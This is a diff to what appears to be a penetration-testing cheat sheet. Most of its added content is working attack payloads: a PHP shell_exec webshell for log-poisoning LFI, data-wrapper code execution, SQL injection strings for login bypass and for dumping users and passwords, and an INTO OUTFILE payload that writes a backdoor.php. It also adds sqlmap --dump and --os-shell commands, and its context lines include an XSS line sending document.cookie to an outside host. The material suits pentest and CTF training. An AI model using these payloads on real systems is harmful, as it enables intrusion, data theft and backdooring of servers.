@@ -399,14 +399,35 @@ File receiver:
 socat TCP4:<IP>:<PORT> file:<FILENAME>,create
 ```
 
-
-
 ## Python Webserver
-Create webserver listening to port 8080 offering files from current working directory
+Create webserver listening to port 9090 offering files from current working directory
 ```bash
-python3 -m http.server 8080
+python3 -m http.server 9090
+python -m SimpleHTTPServer 9090
 ```
+
+## PHP Webserver
+```bash
+php -S 0.0.0.0:9090
+```
+
+## Ruby Webserver
+```bash
+ruby -run -e httpd . -p 9090
+```
+- the "." defines use of current directory as root directory for server
+
+## Busybox Webserver
+```bash
+busybox httpd -f -p 9090
+```
+
+
 # Exploiting
+
+## Webshells
+Webshells are in the following directory on Kali:
+/usr/share/webshells
 
 ## Cross-Site-Scripting (XSS)
 ```javascript
@@ -423,8 +444,31 @@ python3 -m http.server 8080
 <script>new Image().src="http://x.x.x.x/stealer.jpg?output="+document.cookie;<script>
 ```
 
+## PHP Remote Command/Code Execution (through Local File Inclusion)
+Send the following payload as request to webserver with e.g. nc.
+Possibly the webserver logs the request.
+```php
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+```
+After that use Local File Inclusion (LFI) to request a site, include the logfile and use the parameter "&cmd=\<COMMAND\>" to execute os commands.
+
+### PHP Data Wrapper
+Given String is used like a file content for LFIs. (No need to write/manipulate files on webserver)
+```
+data:text/plain,<TESTSTRING>
+data:text/plain,<?php echo shell_exec("dir") ?>
+```
 
 ## SQL Injections
+
+### Authentication Bypass
+```SQL
+select * from users where name = '<USER>' or 1=1;#' and password = '<ANYTHING>';
+select * from users where name = '<USER>' or 1=1 LIMIT 1;#' and password = '<ANYTHING>';
+
+select * from users where name = '<USER>' or 1=1;--' and password = '<ANYTHING>';
+select * from users where name = '<USER>' or 1=1 LIMIT 1;--' and password = '<ANYTHING>';
+```
 
 ### Detect number of columns for UNION attack:
 add a 
@@ -433,6 +477,58 @@ ORDER BY 1--
 ```
 statement to sql command.
 Than increase number after ORDER BY until you receive a error => Value before is the correct number of columns for UNION statement.
+
+
+### Detect which columns are shown
+```SQL
+=1 union all select 1, 2, 3, ...
+```
+
+### Get Data from database
+```SQL
+=1 union all select 1, 2, @@version
+=1 union all select 1, 2, user()
+=1 union all select 1, 2, table_name from information_schema.tables
+=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+=1 union all select 1, username, password from users
+```
+
+### SQL Injection to Code Execution 
+Read files from filesystem:
+```SQL
+=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+```
+
+Write files to filesystem:
+```SQL
+=1 union all select 1, 2,"<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>" into OUTFILE 'c:/wwwdirectory/backdoor.php'
+```
+
+After that call the file with cmd parameter:
+http://\<URL\>/backdoor.php?cmd=\<COMMAND\>
+
+### Automated SQL Injections / Sqlmap
+```bash
+sqlmap -u http://<URL>/file.php?id=1 -p "id"
+```
+
+use recorded request from burp with sqlmap:
+```bash
+sqlmap -r <FILENAME>
+```
+
+#### Dump database with sqlmap
+```bash
+sqlmap -u http://<URL>/file.php?id=1 -p "id" --dbms=<DBMS> --dump
+```
+This also creates csv files with the data.
+
+
+#### Code Execution with sqlmap
+```bash
+sqlmap -u http://<URL>/file.php?id=1 -p "id" --dbms=<DBMS> --os-shell
+```
+
 
 ## Wordpress Exploiting
 When you have valid admin credentials for Wordpress installation use following script to generate malicious plugin and uploading the generated plugin to WP.
@@ -788,3 +884,6 @@ python3 RsaCtfTool.py --publickey <PUBLIC KEY> --uncipherfile <CIPHERED FILE>
 ## Firefox Plugins you may need
 - Foxy Proxy
 - Cookie-Editor
+
+## URL Encodings
+%20 = Space
